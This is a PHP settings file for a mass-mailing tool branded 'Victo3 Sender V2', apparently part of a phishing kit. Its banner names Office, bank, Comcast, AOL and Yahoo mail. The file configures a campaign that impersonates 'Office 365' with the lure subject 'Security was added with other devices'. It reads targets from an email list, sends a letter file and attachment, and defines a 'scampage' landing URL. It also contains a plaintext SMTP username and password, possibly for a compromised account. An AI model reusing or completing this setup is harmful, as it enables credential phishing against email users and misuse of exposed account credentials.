<?php
//
// ██╗   ██╗██╗ ██████╗████████╗ ██████╗ ██████╗     ██╗   ██╗██████╗  
// ██║   ██║██║██╔════╝╚══██╔══╝██╔═══██╗╚════██╗    ██║   ██║╚════██╗
// ██║   ██║██║██║        ██║   ██║   ██║ █████╔╝    ██║   ██║ █████╔╝
// ╚██╗ ██╔╝██║██║        ██║   ██║   ██║ ╚═══██╗    ╚██╗ ██╔╝██╔═══╝ 
//  ╚████╔╝ ██║╚██████╗   ██║   ╚██████╔╝██████╔╝     ╚████╔╝ ███████╗
//   ╚═══╝  ╚═╝ ╚═════╝   ╚═╝    ╚═════╝ ╚═════╝       ╚═══╝  ╚══════╝
//⚚ 𝓥𝓲𝓬𝓽𝓸𝓻 𝓢𝓪𝓷𝓭𝓮𝓻 𝓞𝓕𝓕𝓲𝓬𝓮 𝓑𝓪𝓷𝓴 𝓜𝓪𝓲𝓵 𝓒𝓸𝓶𝓬𝓪𝓼𝓽 𝓐𝓸𝓵 ↭ 𝓨𝓪𝓱𝓸𝓸 2022 ⚚    
//████████SETTINGS██████████████████████████████████████████████████████        
//     █                                                     
//     █       SSL&TLS : ON                
//     █▀▀FILES▀▀▀▀▀▀▀▀▀▀▀▀▀▀█            Copyright © Victo3 Sender 2022  
//     █ Smtp   : Active     █    █▀▀ABOUT▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█ 
//     █ Leads  : Emails.txt █▀▀▀▀█ Latest Version Of Victo3 Sender V2            █   
//     █ Letter : Newt.html  █    █ Your Key  : Get it from the contact           █
//     █▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█    █  █  
//                                █▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█  
//		       
//		  		 (C) 2022 | THE BEST SENDER Victo3 V2 (NG)


/* SMTP SETUP */
$smtp_acc = [
    [
"host"     => "smtpout.secureserver.net",
"port"     => "587",
"username" => "info@arihanthcs.com",
"password" => "Arihant@3621"

    ],
];
/* Features SETUP */

$gx_setup = [
    "priority"       => 1,
    "userandom"      => 0,
    "sleeptime"      => 0,
    "replacement"    => 1,
    "filesend"       => 1,
    "userremoveline" => 0,
    "mail_list"      => "Emails.txt",
    "fromname"       => "Office 365  ",
    "frommail"       => "info@arihanthcs.com",
    "subject"        => "Security was added with other devices",
    "msgfile"        => "letter/Office.html",
    "filepdf"        => "file/attachment/logo.ico",
    "scampage"       => ["https://hootsuite.com"],
];
